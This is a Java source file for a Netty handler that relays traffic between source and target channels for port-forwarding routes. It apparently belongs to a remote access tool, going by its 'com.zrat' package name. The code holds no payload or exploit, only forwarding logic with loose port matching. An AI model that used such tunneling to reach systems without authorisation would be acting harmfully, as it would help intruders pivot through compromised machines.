package com.zrat.server.nio.handler;

import org.jboss.netty.channel.Channel;
import org.jboss.netty.channel.ChannelHandlerContext;
import org.jboss.netty.channel.ChannelStateEvent;
import org.jboss.netty.channel.ExceptionEvent;
import org.jboss.netty.channel.MessageEvent;
import org.jboss.netty.channel.SimpleChannelUpstreamHandler;

import com.zrat.server.controller.PortForwardingServiceImpl;
import com.zrat.transfer.model.Route;

public class TargetForwardingHandler extends SimpleChannelUpstreamHandler {
	@Override
	public void channelClosed(ChannelHandlerContext ctx, ChannelStateEvent e) {
		for(Route r:PortForwardingServiceImpl.routes){
			if (ctx.getChannel().getRemoteAddress().toString().endsWith(r.getTargetPort())){
				r.setTargetChannel(null);
			}
		}
	}

	@Override
	public void channelConnected(ChannelHandlerContext ctx, ChannelStateEvent e){
		for(Route r:PortForwardingServiceImpl.routes){
			if (ctx.getChannel().getRemoteAddress().toString().endsWith(r.getTargetPort())){
				r.setTargetChannel(ctx.getChannel());
			}
		}
	}

	@Override
	public void messageReceived(ChannelHandlerContext ctx, MessageEvent e) {
		System.out.println(this.getClass().getName());
		Channel channel = null;
		for(Route r:PortForwardingServiceImpl.routes){
			if (ctx.getChannel().getRemoteAddress().toString().endsWith(r.getTargetPort())){
				channel = r.getSourceChannel();
			}
		}
		if (channel != null){
			channel.write(e.getMessage());
		}else{
			ctx.sendUpstream(e);
		}
	}

	public void exceptionCaught(ChannelHandlerContext ctx, ExceptionEvent e)
			throws Exception {
		e.getCause().printStackTrace();
	}
}
